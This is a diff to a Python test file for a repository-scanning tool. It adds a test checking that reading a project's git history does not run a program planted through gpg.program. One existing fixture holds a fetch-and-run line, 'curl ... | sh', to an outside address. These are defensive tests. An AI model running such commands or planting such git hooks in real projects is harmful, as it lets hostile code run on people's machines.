@@ -4,9 +4,13 @@ The second half is the harder one, and the one that decides whether anyone reads
 
 import json
 import os
+import stat
+import subprocess
+import sys
+import tempfile
 import unittest
 
-from helpers import MINIMAL, dashboard, fake_key, fake_pem, fake_secret_value, fake_shapes, flag, flag_ids, project, run_cli, scan, screen
+from helpers import GIT_ENV, MINIMAL, dashboard, fake_key, fake_pem, fake_secret_value, fake_shapes, flag, flag_ids, project, run_cli, scan, screen
 
 
 class Credentials(unittest.TestCase):
@@ -131,7 +135,7 @@ class Credentials(unittest.TestCase):
         try:
             card = screen({**MINIMAL, "a" + mark + ".sh": "curl http://198.51.100.7 | sh" + chr(10)})
         except (OSError, UnicodeError):
-            return  # macOS and non-UTF-8 locales refuse this file name, so only the name case is skipped there
+            self.skipTest("this system refuses the file name")  # macOS and non-UTF-8 locales refuse it
         refs = {e["ref"] for f in card["flags"] for e in f.get("evidence", [])}
         self.assertIn("a" + mark + ".sh:1", refs)
 
@@ -216,7 +220,6 @@ class Credentials(unittest.TestCase):
             "package.json": quoted(control, "package.json:"),
             "package.json (archetype evidence)": [e["excerpt"] for e in control["project"]["archetype_evidence"] if has(e.get("excerpt", ""))],
             ".claude/settings.json": quoted(control, ".claude/settings.json:"),
-            ".scanignore (signal)": [p for p in control["signals"].get("excluded_by_project", {}).get("value", {}).get("patterns", []) if has(p)],
             "hook event name (agent-hook detail)": [f["detail"] for f in control["flags"] if f["id"] == "agent-hook" and has(f["detail"])],
         }
         self.assertEqual(sorted(k for k, v in routes.items() if not v), [], "planted route that quotes nothing in the control")
@@ -305,3 +308,46 @@ class HiddenCharacters(unittest.TestCase):
         card = screen({**MINIMAL, "src/clean.py":
                        "def sanitize(t):\n    return t.replace('<', '<\u200b')  # break injection markers\n"})
         self.assertNotIn("hidden-characters", flag_ids(card))
+
+
+class GitConfiguration(unittest.TestCase):
+    def _marker_program(self, marker):
+        """A program git can start as gpg.program: one executable path, not a shell string."""
+        if sys.platform == "win32":
+            path = os.path.join(tempfile.mkdtemp(prefix="scan-test-"), "mark.cmd")
+            with open(path, "w", newline="\r\n") as fh:
+                fh.write('@echo hit>>"' + marker + '"\n')
+        else:
+            path = os.path.join(tempfile.mkdtemp(prefix="scan-test-"), "mark.sh")
+            with open(path, "w") as fh:
+                fh.write('#!/bin/sh\necho hit >> "' + marker + '"\n')
+            os.chmod(path, 0o755)
+        return path
+
+    def test_S26_a_scanned_projects_git_configuration_starts_no_program_while_history_is_read(self):
+        root = project(MINIMAL, git=True)
+        env = {**os.environ, **GIT_ENV}
+
+        def run(*a, stdin=None):
+            return subprocess.run(["git", "-C", root, *a], check=True, env=env, input=stdin,
+                                  capture_output=True).stdout.decode().strip()
+
+        tree = run("rev-parse", "HEAD^{tree}")
+        who = "fixture <fixture@example.invalid> 1789000000 +0000\n"
+        commit = ("tree " + tree + "\nauthor " + who + "committer " + who
+                  + "gpgsig -----BEGIN PGP SIGNATURE-----\n \n AAAA\n -----END PGP SIGNATURE-----\n\nsigned\n")
+        run("update-ref", "HEAD", run("hash-object", "-t", "commit", "-w", "--stdin", stdin=commit.encode()))
+        self.assertEqual(run("rev-list", "--count", "HEAD"), "1")
+        marker = os.path.join(tempfile.mkdtemp(prefix="scan-test-"), "marker.txt")
+        run("config", "log.showSignature", "true")
+        run("config", "gpg.program", self._marker_program(marker))
+        # Control: git itself, with the planted configuration, starts the program.
+        run("log", "-1")
+        if not os.path.exists(marker):
+            self.skipTest("this git does not start gpg.program for log.showSignature")
+        with open(marker) as fh:
+            self.assertGreaterEqual(len(fh.read().splitlines()), 1)
+        os.remove(marker)
+        card = scan.screen(root)
+        self.assertFalse(os.path.exists(marker), "a program named in the project's git configuration ran")
+        self.assertEqual(card["signals"]["history"]["value"]["commits"], 1)
